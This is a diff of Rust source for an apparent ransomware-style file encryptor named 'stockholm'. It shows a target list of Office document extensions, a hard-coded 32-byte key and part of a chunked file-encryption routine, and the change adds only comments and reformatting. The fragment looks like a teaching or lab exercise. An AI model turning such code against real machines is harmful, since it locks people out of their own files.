@@ -34,11 +34,14 @@ const FILE_EXTENSIONS: &[&str] = &[
     "dotx", "dotm", "dot", "docm", "docb", "docx", "doc"
 ];
 const READ_SIZE: usize = 4096;
-const KEY : &[u8 ; 32] = &[1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4, 1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4];
+const KEY : &[u8 ; 32] = &[1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4,
+	1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4];
 const RED: &str = "\x1b[31m";
 const RESET: &str = "\x1b[0m";
 
-
+/*Random nonce is required to avoid decrypting the file by running stockholm
+without --reverse option on encrypted file (That would be possible if we
+used a constant nonce).*/
 fn get_random_nonce() -> [u8 ; 24] {
 	let nonce: [u8 ; 24] = rand::random();
 	return nonce;
@@ -67,7 +70,9 @@ fn	encrypt_content(contents: &[u8], nonce: &[u8 ; 24]) -> Result<Vec<u8>,  Box<d
 	}
 }
 
-
+/*The random nonce is written at the begining of the file (not encrypted).
+The decryption option will use it with the key given by the user to decrypt
+files. Data is encrypted in chunks of size READ_SIZE*/
 fn encrypt_file(filename: &PathBuf, silent: bool) -> Result<(), Box<dyn Error>> {
 	let nonce = get_random_nonce();
 	let new_name = get_new_filename(filename)?;
